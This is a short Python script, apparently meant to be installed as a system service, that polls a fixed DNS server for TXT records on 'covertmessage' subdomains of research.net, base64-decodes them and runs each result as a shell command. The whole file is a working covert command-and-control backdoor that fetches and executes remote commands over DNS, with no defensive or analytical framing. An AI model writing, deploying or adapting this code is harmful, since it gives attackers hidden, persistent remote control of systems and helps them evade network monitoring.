# stored in /opt/covert_channel for system service to be executed
import dns.resolver
import base64
import subprocess

# Define server and domain
dns_server = "192.168.47.101"
domain = "research.net"
subdomains = ["covertmessage1", "covertmessage2"]  # List of subdomains to query

def decode_message(encoded_message):
    """
    Decode the Base64 encoded message.
    """
    try:
        return base64.b64decode(encoded_message).decode()
    except Exception as e:
        print(f"Error decoding message: {e}")
        return None

def execute_command(command):
    """
    Execute the decoded command on the server.
    """
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        if result.returncode == 0:
            print(f"Command executed successfully:\n{result.stdout}")
        else:
            print(f"Error executing command:\n{result.stderr}")
    except Exception as e:
        print(f"Error while executing the command: {e}")

def get_covert_messages():
    """
    Query the DNS server for covert messages stored in TXT records and execute them.
    """
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]

    for subdomain in subdomains:
        try:
            response = resolver.resolve(f"{subdomain}.{domain}", 'TXT')
            for txt_record in response:
                encoded_message = txt_record.to_text().strip('"')  # Remove quotes
                decoded_message = decode_message(encoded_message)
                if decoded_message:
                    print(f"Decoded Message from {subdomain}: {decoded_message}")
                    execute_command(decoded_message)
        except dns.resolver.NoAnswer:
            print(f"No TXT record found for {subdomain}.")
        except dns.resolver.NXDOMAIN:
            print(f"The domain {subdomain}.{domain} does not exist.")
        except Exception as e:
            print(f"DNS Query Failed for {subdomain}: {e}")

if __name__ == '__main__':
    get_covert_messages()
